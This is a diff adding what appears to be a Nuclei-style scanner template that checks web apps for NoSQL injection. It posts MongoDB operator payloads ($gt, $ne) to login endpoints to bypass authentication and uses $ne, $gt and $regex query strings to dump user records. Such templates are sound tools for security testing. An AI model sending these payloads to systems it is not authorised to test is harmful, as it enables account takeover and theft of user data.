@@ -1,0 +1,78 @@
+id: whai-nosql-injection
+
+info:
+  name: NoSQL Injection Detection
+  author: whitehat-ai
+  severity: high
+  description: Detects NoSQL injection vulnerabilities in MongoDB and similar databases
+  tags: nosql,injection,mongodb
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/api/auth/login"
+      - "{{BaseURL}}/api/v1/auth/login"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":{"$gt":""},"password":{"$gt":""}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(token|jwt|session|access_token|welcome|success|logged)"
+
+      - type: word
+        negative: true
+        part: body
+        words:
+          - "invalid"
+          - "wrong"
+          - "failed"
+          - "error"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":{"$ne":"nonexistent"},"password":{"$ne":"nonexistent"}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(token|jwt|session|access_token)"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?username[$ne]=null"
+      - "{{BaseURL}}/api/users?username[$gt]=&password[$gt]="
+      - "{{BaseURL}}/api/search?q[$regex]=.*"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(\"_id\"|\"username\"|\"email\".*\"password\")"
